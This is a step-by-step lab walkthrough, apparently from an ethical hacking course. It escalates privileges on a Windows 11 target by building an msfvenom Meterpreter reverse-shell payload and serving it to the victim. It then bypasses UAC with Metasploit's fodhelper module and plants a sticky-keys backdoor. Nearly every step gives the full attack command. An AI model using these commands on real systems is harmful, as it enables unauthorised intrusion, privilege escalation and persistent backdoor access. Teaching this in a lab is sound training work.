
## Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys


**Parrot Security** machine and login with **attacker/toor**. Open a **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**)

Now, run **cd** command to jump to the root directory

Run the command **msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe**
  
In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share Windows.exe with the victim machine.

To create a new directory to share the **Windows.exe** file with the target machine and provide the permissions, use the below commands:

- Run **mkdir /var/www/html/share** command to create a shared folder
- Run **chmod -R 755 /var/www/html/share** command
- Run **chown -R www-data:www-data /var/www/html/share** command

Copy the payload into the shared folder by executing **cp /home/attacker/Desktop/Windows.exe /var/www/html/share/** command

Start the Apache server by executing **service apache2 start** command

Run **msfconsole** command in the terminal window to launch Metasploit Framework
 
In Metasploit type **use exploit/multi/handler** and press **Enter**

Now, type **set payload windows/meterpreter/reverse_tcp** and press **Enter**

Type **set lhost 10.10.1.13** and press **Enter** to set lhost

Type **set lport 444** and press **Enter** to set lport

Now, type **run** in the Metasploit console and press **Enter**

**Windows 11** machine, click [Ctrl+Alt+Delete](https://labclient.labondemand.com/Instructions/b23f3920-d498-4113-9bbb-12cd16f9c53f#) to activate the machine and login

Open any web browser (here, Mozilla Firefox). In the address bar place your mouse cursor, type **http://10.10.1.13/share** and press **Enter**. As soon as you press enter, it will display the shared folder contents

Click on **Windows.exe** to download the file
  
Navigate to the **Downloads** folder and double-click the **Windows.exe** file

Leave the **Windows 11** machine running and click [Parrot Security](https://labclient.labondemand.com/Instructions/b23f3920-d498-4113-9bbb-12cd16f9c53f#) to switch to the **Parrot Security** machine

The Meterpreter session has successfully been opened, as shown in the screenshot

Type **sysinfo** and press **Enter**. Issuing this command displays target machine information such as computer name, OS, and domain

Type **getuid** and press **Enter**, to display current user ID

Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine

Type **background** and press **Enter**, to background the current session

Type **search bypassuac** and press **Enter**, to get the list of bypassuac modules
In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit

In the terminal window, type **use exploit/windows/local/bypassuac_fodhelper** and press **Enter**

Type **set session 1** and press **Enter**
  
Type **show options** in the meterpreter console and press **Enter**

To set the **LHOST** option, type **set LHOST 10.10.1.13** and press **Enter**

To set the **TARGET** option, type **set TARGET 0** and press **Enter** (here, 0 indicates nothing, but the Exploit Target ID)

Type **exploit** and press **Enter** to begin the exploit on **Windows 11** machine

The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine
  
Type **getsystem -t 1** and press **Enter** to elevate privileges

Now, type **getuid** and press **Enter**. The meterpreter session is now running with system privileges

Type **background** and press **Enter** to background the current session

Type **use post/windows/manage/sticky_keys** and press **Enter**

Now type **sessions -i*** and press **Enter** to list the sessions in meterpreter

In the console type **set session 2** to set the privileged session as the current session
  
In the console type **exploit** and press **Enter**, to begin the exploit

to switch to **Windows 11** machine and sign out from the **Admin** account and sign into **Martin** account using **apple** as password

Martin is a user account without any admin privileges, lock the system and from the lock screen press **Shift** key **5** times, this will open a command prompt on the lock screen with System privileges instead of sticky keys error window

In the Command Prompt window, type **whoami** and press **Enter**

We can see that we have successfully got a persistent System level access to the target system by exploiting sticky keys

